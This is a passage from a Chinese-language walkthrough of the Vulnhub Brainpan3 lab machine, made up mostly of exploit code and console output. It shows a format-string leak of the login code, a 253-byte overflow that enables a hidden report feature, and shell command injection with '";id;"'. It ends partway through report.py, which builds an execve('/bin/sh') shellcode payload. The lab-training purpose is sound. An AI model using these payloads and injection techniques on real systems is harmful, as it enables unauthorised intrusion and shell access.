<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">from select import select</span><br><span class="line">from socket import *</span><br><span class="line">from time import sleep</span><br><span class="line">import telnetlib</span><br><span class="line">import sys</span><br><span class="line">import struct</span><br><span class="line">import re</span><br><span class="line"> </span><br><span class="line">class NetcatClient:</span><br><span class="line">    def __init__(self, host, port):</span><br><span class="line">        <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">        Netcat Class init.</span></span><br><span class="line"><span class="string">        &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">        self.host = host</span><br><span class="line">        self.port = int(port)</span><br><span class="line">        self.delay = 0.05</span><br><span class="line">        self.linemode = False</span><br><span class="line">        self.sock = socket(AF_INET, SOCK_STREAM)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># private functions</span></span><br><span class="line">    def __check_state(self, timeout=0):</span><br><span class="line">        <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">        Check the socket it&#x27;s read, write and exception state </span></span><br><span class="line"><span class="string">        using select</span></span><br><span class="line"><span class="string">        &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="comment"># we need abit of a delay to keep things</span></span><br><span class="line">        <span class="comment"># running smooth</span></span><br><span class="line">        sleep(self.delay)</span><br><span class="line">        <span class="built_in">return</span> select([self.sock], [self.sock], [self.sock], timeout)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># core functions</span></span><br><span class="line">    def connect(self):</span><br><span class="line">        <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">        Connect to host</span></span><br><span class="line"><span class="string">        &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">        try:</span><br><span class="line">            self.sock.connect((self.host, self.port))</span><br><span class="line">            <span class="built_in">return</span> True</span><br><span class="line">        except error as e:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;NetcatClassError:&#x27;</span>, e</span><br><span class="line">            <span class="built_in">return</span> False</span><br><span class="line"> </span><br><span class="line">    def close(self):</span><br><span class="line">        <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">        Close the connection</span></span><br><span class="line"><span class="string">        &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">        try:</span><br><span class="line">            self.sock.close()</span><br><span class="line">        except error as e:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;NetcatClassError:&#x27;</span>, e</span><br><span class="line"> </span><br><span class="line">    def recv(self, size=4096):</span><br><span class="line">        <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">        Recieve all data</span></span><br><span class="line"><span class="string">        &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">        try:</span><br><span class="line">            data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">            readable, writable, exceptional = self.__check_state()</span><br><span class="line">            <span class="keyword">if</span> readable:</span><br><span class="line">                <span class="comment"># while socket readable...</span></span><br><span class="line">                <span class="keyword">while</span> readable:</span><br><span class="line">                    <span class="comment"># collect all data</span></span><br><span class="line">                    data += self.sock.recv(size)</span><br><span class="line">                    <span class="comment"># re-check socket&#x27;s state</span></span><br><span class="line">                    readable, writable, exceptional = self.__check_state()</span><br><span class="line">            <span class="built_in">return</span> data</span><br><span class="line">        except error as e:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;NetcatClassError:&#x27;</span>, e</span><br><span class="line"> </span><br><span class="line">    def send(self, data):</span><br><span class="line">        <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">        Send data</span></span><br><span class="line"><span class="string">        &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> self.linemode:</span><br><span class="line">            data += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">        try:</span><br><span class="line">            readable, writable, exceptional = self.__check_state()</span><br><span class="line">            <span class="keyword">if</span> writable:</span><br><span class="line">                self.sock.send(data)</span><br><span class="line">        except error as e:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;NetcatClassError:&#x27;</span>, e</span><br><span class="line"> </span><br><span class="line">    def sendrecv(self, data):</span><br><span class="line">        <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">        Send and recieve data</span></span><br><span class="line"><span class="string">        &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">        self.send( data )</span><br><span class="line">        <span class="built_in">return</span> self.recv()</span><br><span class="line"> </span><br><span class="line">    def interact(self):</span><br><span class="line">        <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">        Interactive telnet client</span></span><br><span class="line"><span class="string">        &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">        try:</span><br><span class="line">            t = telnetlib.Telnet()</span><br><span class="line">            t.sock = self.sock</span><br><span class="line">            t.interact()</span><br><span class="line">            t.close()</span><br><span class="line">        except KeyboardInterrupt:</span><br><span class="line">            self.close()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># fuzzing code</span></span><br><span class="line">    s = NetcatClient(<span class="string">&#x27;192.168.56.117&#x27;</span>, <span class="string">&#x27;1337&#x27;</span>)</span><br><span class="line">    s.linemode = True</span><br><span class="line">    s.connect()</span><br><span class="line">    <span class="comment"># banner</span></span><br><span class="line">    s.recv()</span><br><span class="line">    <span class="comment"># send format string pattern and grab the login code</span></span><br><span class="line">    r = s.sendrecv(<span class="string">&#x27;%3$d&#x27;</span>)</span><br><span class="line">    <span class="comment"># parse the login code from the reponse</span></span><br><span class="line">    l = re.findall(r<span class="string">&quot;INVALID ACCESS CODE: (.*?)\n&quot;</span>, r)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;login code -&gt; &#x27;</span>, l</span><br><span class="line">    <span class="comment"># send login code and log in</span></span><br><span class="line">    s.sendrecv(<span class="string">&#x27;%s&#x27;</span>%(l[0]))</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># send change sessionname commands</span></span><br><span class="line">    <span class="comment"># with length of 0 ... 255</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(256):</span><br><span class="line">        s.sendrecv(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">        resp = s.sendrecv(i * <span class="string">&#x27;Y&#x27;</span>)</span><br><span class="line">        l = re.findall(r<span class="string">&quot;REPORT \[(.*?)\]&quot;</span>, resp)</span><br><span class="line">        <span class="built_in">print</span> i,<span class="string">&#x27;-&gt;&#x27;</span>,l</span><br><span class="line">        <span class="comment"># if value changed to Y break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Y&#x27;</span> <span class="keyword">in</span> l[0]:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;payload -&gt; %d * Y&#x27;</span> % (i)</span><br><span class="line">            <span class="built_in">break</span></span><br><span class="line"> </span><br><span class="line">    s.close()</span><br></pre></td></tr></table></figure>

<p>运行模糊测试器会导致：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/brainpan3<span class="comment"># python test.py </span></span><br><span class="line">login code -&gt;  [<span class="string">&#x27;2433&#x27;</span>]</span><br><span class="line">0 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">1 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">2 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">3 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">4 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">5 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">6 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">7 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">8 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">9 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">10 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">11 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">12 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">13 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">14 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">15 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">16 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">17 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">18 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">19 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">20 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">21 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">22 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">23 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">24 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">25 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">26 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">27 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">28 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">29 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">30 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">31 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">32 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">...</span><br><span class="line">244 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">245 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">246 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">247 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">248 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">249 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">250 -&gt; [<span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">251 -&gt; [<span class="string">&#x27;\x00&#x27;</span>]</span><br><span class="line">252 -&gt; [<span class="string">&#x27;\x00&#x27;</span>]</span><br><span class="line">253 -&gt; [<span class="string">&#x27;Y&#x27;</span>]</span><br><span class="line">payload -&gt; 253 * Y</span><br></pre></td></tr></table></figure>

<p>因此，通过将session名称设置为253个Y字符，将REPORT功能状态从N更改为Y，从而有效地启用了report功能。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ENTER COMMAND: 3</span><br><span class="line">SELECTED: 3</span><br><span class="line">ENTER NEW SESSION NAME: YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY</span><br><span class="line">--------------------------------------------------------------</span><br><span class="line">SESSION: YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY</span><br><span class="line">  AUTH   [Y]    REPORT [Y]    MENU   [Y]  </span><br><span class="line">--------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1  - CREATE REPORT</span><br><span class="line">2  - VIEW CODE REPOSITORY</span><br><span class="line">3  - UPDATE SESSION NAME</span><br><span class="line">4  - SHELL</span><br><span class="line">5  - LOG OFF</span><br></pre></td></tr></table></figure>

<p>在测试该选项时，现在可以看到其确实启用了……</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ENTER COMMAND: 1</span><br><span class="line">SELECTED: 1</span><br><span class="line"></span><br><span class="line">ENTER REPORT, END WITH NEW LINE:</span><br><span class="line"></span><br><span class="line">fuckfuckfuckfuckfuck</span><br><span class="line"></span><br><span class="line">REPORT [fuckfuckfuckfuckfuck@]</span><br><span class="line">SENDING TO REPORT MODULE</span><br><span class="line"></span><br><span class="line">[+] WRITING REPORT TO /home/anansi/REPORTS/20200205215605.rep</span><br><span class="line">[+] DATA SUCCESSFULLY ENCRYPTED</span><br><span class="line">[+] DATA SUCCESSFULLY RECORDED</span><br><span class="line">[+] RECORDED [II]</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------</span><br><span class="line">SESSION: YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY</span><br><span class="line">  AUTH   [Y]    REPORT [Y]    MENU   [Y]  </span><br><span class="line">--------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1  - CREATE REPORT</span><br><span class="line">2  - VIEW CODE REPOSITORY</span><br><span class="line">3  - UPDATE SESSION NAME</span><br><span class="line">4  - SHELL</span><br><span class="line">5  - LOG OFF</span><br></pre></td></tr></table></figure>

<p>因此，现在可以在Brainpan控制台中创建报告，并在报告可执行文件中触发易受攻击的代码，不是吗？似乎Brainpan控制台使用1选项执行了报告可执行文件，并且为了触发record_id中的易受攻击的代码，需要使用0选项来执行它。在这里有些卡住，要在报告缓冲区中打更多的主意。在报表数据中插入双引号时，会出现一个有趣的错误</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ENTER COMMAND: 1</span><br><span class="line">SELECTED: 1</span><br><span class="line"></span><br><span class="line">ENTER REPORT, END WITH NEW LINE:</span><br><span class="line"></span><br><span class="line">aaa<span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">REPORT [aaa&quot;</span>fuckfuckfuckfuck@]</span><br><span class="line">SENDING TO REPORT MODULE</span><br><span class="line"></span><br><span class="line">sh: 1: Syntax error: Unterminated quoted string</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------</span><br><span class="line">SESSION: YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY</span><br><span class="line">  AUTH   [Y]    REPORT [Y]    MENU   [Y]  </span><br><span class="line">--------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1  - CREATE REPORT</span><br><span class="line">2  - VIEW CODE REPOSITORY</span><br><span class="line">3  - UPDATE SESSION NAME</span><br><span class="line">4  - SHELL</span><br><span class="line">5  - LOG OFF</span><br></pre></td></tr></table></figure>

<p>似乎双引号引起了执行报告命令行时的错误，更准确地说，是未引用的字符串的一部分，但更有趣的是，似乎可以使用报告数据进行命令注入。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ENTER COMMAND: 1</span><br><span class="line">SELECTED: 1</span><br><span class="line"></span><br><span class="line">ENTER REPORT, END WITH NEW LINE:</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;;id;&quot;</span></span><br><span class="line"></span><br><span class="line">REPORT [<span class="string">&quot;;id;&quot;</span>ckfuckfuckfuck@]</span><br><span class="line">SENDING TO REPORT MODULE</span><br><span class="line"></span><br><span class="line">/var/www/repo/report &lt;report&gt; [0|1]</span><br><span class="line">uid=1000(anansi) gid=1003(webdev) groups=1000(anansi)</span><br><span class="line">sh: 1: ckfuckfuckfuck@: not found</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------</span><br><span class="line">SESSION: YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY</span><br><span class="line">  AUTH   [Y]    REPORT [Y]    MENU   [Y]  </span><br><span class="line">--------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1  - CREATE REPORT</span><br><span class="line">2  - VIEW CODE REPOSITORY</span><br><span class="line">3  - UPDATE SESSION NAME</span><br><span class="line">4  - SHELL</span><br><span class="line">5  - LOG OFF</span><br><span class="line"></span><br><span class="line">ENTER COMMAND: 1</span><br><span class="line">SELECTED: 1</span><br><span class="line"></span><br><span class="line">ENTER REPORT, END WITH NEW LINE:</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;;ls;&quot;</span>          </span><br><span class="line"></span><br><span class="line">REPORT [<span class="string">&quot;;ls;&quot;</span>ckfuckfuckfuck@]</span><br><span class="line">SENDING TO REPORT MODULE</span><br><span class="line"></span><br><span class="line">/var/www/repo/report &lt;report&gt; [0|1]</span><br><span class="line">bin</span><br><span class="line">boot</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">home</span><br><span class="line">initrd.img</span><br><span class="line">initrd.img.old</span><br><span class="line">lib</span><br><span class="line">lost+found</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">opt</span><br><span class="line">proc</span><br><span class="line">root</span><br><span class="line">run</span><br><span class="line">sbin</span><br><span class="line">srv</span><br><span class="line">sys</span><br><span class="line">tmp</span><br><span class="line">usr</span><br><span class="line">var</span><br><span class="line">vmlinuz</span><br><span class="line">vmlinuz.old</span><br><span class="line">sh: 1: ckfuckfuckfuck@: not found</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------</span><br><span class="line">SESSION: YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY</span><br><span class="line">  AUTH   [Y]    REPORT [Y]    MENU   [Y]  </span><br><span class="line">--------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1  - CREATE REPORT</span><br><span class="line">2  - VIEW CODE REPOSITORY</span><br><span class="line">3  - UPDATE SESSION NAME</span><br><span class="line">4  - SHELL</span><br><span class="line">5  - LOG OFF</span><br></pre></td></tr></table></figure>

<p>还可以在命令行中插入0来触发record_id中的易受攻击的代码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ENTER COMMAND: 1</span><br><span class="line">SELECTED: 1</span><br><span class="line"></span><br><span class="line">ENTER REPORT, END WITH NEW LINE:</span><br><span class="line"></span><br><span class="line">aasdcasdc<span class="string">&quot; 0 #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">REPORT [aasdcasdc&quot;</span> 0 <span class="comment">#ckfuck@]</span></span><br><span class="line">SENDING TO REPORT MODULE</span><br><span class="line"></span><br><span class="line">Segmentation fault (core dumped)</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------</span><br><span class="line">SESSION: YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY</span><br><span class="line">  AUTH   [Y]    REPORT [Y]    MENU   [Y]  </span><br><span class="line">--------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1  - CREATE REPORT</span><br><span class="line">2  - VIEW CODE REPOSITORY</span><br><span class="line">3  - UPDATE SESSION NAME</span><br><span class="line">4  - SHELL</span><br><span class="line">5  - LOG OFF</span><br></pre></td></tr></table></figure>

<h3 id="编写python脚本来利用"><a href="#编写python脚本来利用" class="headerlink" title="编写python脚本来利用"></a>编写python脚本来利用</h3><p> – 获取登录代码并登录<br> – 启用report功能<br> – 发送包含0选项的payload report<br> – 获取shell</p>
<p>以下代码自动完成了整个过程：</p>
<p>report.py</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">from select import select</span><br><span class="line">from socket import *</span><br><span class="line">from time import sleep</span><br><span class="line">import telnetlib, sys, re, struct</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class NetcatClass:</span><br><span class="line">    def __init__(self, host, port):</span><br><span class="line">        <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">        Netcat Class init.</span></span><br><span class="line"><span class="string">        &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">        self.host = host</span><br><span class="line">        self.port = int(port)</span><br><span class="line">        self.delay = 0.05</span><br><span class="line">        self.linemode = False</span><br><span class="line">        self.sock = socket(AF_INET, SOCK_STREAM)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># private functions</span></span><br><span class="line">    def __check_state(self, timeout=0):</span><br><span class="line">        <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">        Check the socket it&#x27;s read, write and exception state </span></span><br><span class="line"><span class="string">        using select</span></span><br><span class="line"><span class="string">        &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="comment"># we need abit of a delay to keep things</span></span><br><span class="line">        <span class="comment"># running smooth</span></span><br><span class="line">        sleep(self.delay)</span><br><span class="line">        <span class="built_in">return</span> select([self.sock], [self.sock], [self.sock], timeout)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># core functions</span></span><br><span class="line">    def connect(self):</span><br><span class="line">        <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">        Connect to host</span></span><br><span class="line"><span class="string">        &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">        try:</span><br><span class="line">            self.sock.connect((self.host, self.port))</span><br><span class="line">            <span class="built_in">return</span> True</span><br><span class="line">        except error as e:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;NetcatClassError:&#x27;</span>, e</span><br><span class="line">            <span class="built_in">return</span> False</span><br><span class="line"> </span><br><span class="line">    def close(self):</span><br><span class="line">        <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">        Close the connection</span></span><br><span class="line"><span class="string">        &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">        try:</span><br><span class="line">            self.sock.close()</span><br><span class="line">        except error as e:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;NetcatClassError:&#x27;</span>, e</span><br><span class="line"> </span><br><span class="line">    def recv(self, size=4096):</span><br><span class="line">        <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">        Recieve all data</span></span><br><span class="line"><span class="string">        &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">        try:</span><br><span class="line">            data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">            readable, writable, exceptional = self.__check_state()</span><br><span class="line">            <span class="keyword">if</span> readable:</span><br><span class="line">                <span class="comment"># while socket readable...</span></span><br><span class="line">                <span class="keyword">while</span> readable:</span><br><span class="line">                    <span class="comment"># collect all data</span></span><br><span class="line">                    data += self.sock.recv(size)</span><br><span class="line">                    <span class="comment"># re-check socket&#x27;s state</span></span><br><span class="line">                    readable, writable, exceptional = self.__check_state()</span><br><span class="line">            <span class="built_in">return</span> data</span><br><span class="line">        except error as e:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;NetcatClassError:&#x27;</span>, e</span><br><span class="line"> </span><br><span class="line">    def send(self, data):</span><br><span class="line">        <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">        Send data</span></span><br><span class="line"><span class="string">        &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">        try:</span><br><span class="line">            readable, writable, exceptional = self.__check_state()</span><br><span class="line">            <span class="keyword">if</span> writable:</span><br><span class="line">                <span class="keyword">if</span> self.linemode:</span><br><span class="line">                    data += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">                self.sock.sendall(data)</span><br><span class="line">        except error as e:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;NetcatClassError:&#x27;</span>, e</span><br><span class="line"> </span><br><span class="line">    def sendrecv(self, data):</span><br><span class="line">        <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">        Send and recieve data</span></span><br><span class="line"><span class="string">        &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">        self.send(data)</span><br><span class="line">        <span class="built_in">return</span> self.recv()</span><br><span class="line"> </span><br><span class="line">    def interact(self):</span><br><span class="line">        <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">        Interactive telnet client</span></span><br><span class="line"><span class="string">        &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">        try:</span><br><span class="line">            t = telnetlib.Telnet()</span><br><span class="line">            t.sock = self.sock</span><br><span class="line">            t.interact()</span><br><span class="line">            t.close()</span><br><span class="line">        except KeyboardInterrupt:</span><br><span class="line">            self.close()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def p(v):</span><br><span class="line">    <span class="built_in">return</span> struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, v)</span><br><span class="line"> </span><br><span class="line">def exploit(host, port):</span><br><span class="line">    <span class="comment"># connect</span></span><br><span class="line">    s = NetcatClass(host, port)</span><br><span class="line">    <span class="comment"># make all sends being treathed as line&#x27;s eq. add a \n</span></span><br><span class="line">    s.linemode = True</span><br><span class="line">    s.connect()</span><br><span class="line">    <span class="comment"># recieve banner</span></span><br><span class="line">    s.recv()</span><br><span class="line">    <span class="comment"># send formatstring pattern and read response containing access code    </span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;[+] Leak access code&#x27;</span></span><br><span class="line">    acccode = re.findall(r<span class="string">&quot;INVALID ACCESS CODE: (.*?)\n&quot;</span>, s.sendrecv(<span class="string">&#x27;%3$d&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> not acccode:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;[!] Failed to get access code!&#x27;</span></span><br><span class="line">        s.close()</span><br><span class="line">        <span class="built_in">exit</span>()  </span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;[+] Access code leaked: &#123;&#125;&#x27;</span>.format(acccode[0])</span><br><span class="line">    <span class="comment"># send access code</span></span><br><span class="line">    s.sendrecv(acccode[0])</span><br><span class="line">    <span class="comment"># enable report feature</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;[+] Enabling report feature&#x27;</span></span><br><span class="line">    s.sendrecv(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    s.sendrecv(253 * <span class="string">&#x27;Y&#x27;</span>)</span><br><span class="line">    <span class="comment"># create payload</span></span><br><span class="line">    <span class="comment"># linux/x86 Shellcode execve (&quot;/bin/sh&quot;) - 21 Bytes</span></span><br><span class="line">    <span class="comment"># http://shell-storm.org/shellcode/files/shellcode-752.php</span></span><br><span class="line">    shellcode = <span class="string">&quot;\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span></span><br><span class="line">    <span class="comment"># .bss:0804B0A0 ; char REPORT[500]</span></span><br><span class="line">    <span class="comment"># strncpy(REPORT, buf, 100u);</span></span><br><span class="line">    __bss_REPORT = 0x0804B0A0</span><br><span class="line">    <span class="comment"># construct payload report  </span></span><br><span class="line">    payload  = <span class="string">&quot;AAA&quot;</span></span><br><span class="line">    payload += p(__bss_REPORT + 7)</span><br><span class="line">    payload += shellcode</span><br><span class="line">    <span class="comment"># inject double qoute and a 0 to trigger</span></span><br><span class="line">    <span class="comment"># the vulnerable code in record_id</span></span><br><span class="line">    payload += <span class="string">&#x27;&quot; 